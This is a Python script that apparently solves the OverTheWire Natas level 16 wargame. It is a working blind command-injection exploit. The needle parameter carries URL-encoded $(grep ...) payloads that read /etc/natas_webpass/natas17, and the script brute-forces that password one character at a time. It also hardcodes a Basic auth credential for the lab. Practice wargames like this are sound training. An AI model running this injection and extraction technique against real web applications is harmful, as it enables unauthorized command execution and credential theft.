import requests

url = 'http://natas16.natas.labs.overthewire.org/index.php?debug=True'
# url = http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+a+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search
headers = { 'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='}
characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# attempt is the password attempt
def send_payload(attempt, like):
    if like:   # regex ^password
        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'
    else:      # regex ^password$
        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'
    r = requests.get(url, headers=headers)
    raw = str(r.content)
    return "zigzag" not in raw

passwd = ""; found = False
while not found:
    for c in characters:
        correct = send_payload(passwd + c, like=True)
        print("attempting:", passwd+c)
        if correct:
            passwd += c
            print("GOT IT:", passwd)
            found = send_payload(passwd, like=False)
            break

print("\nThe password is", passwd)
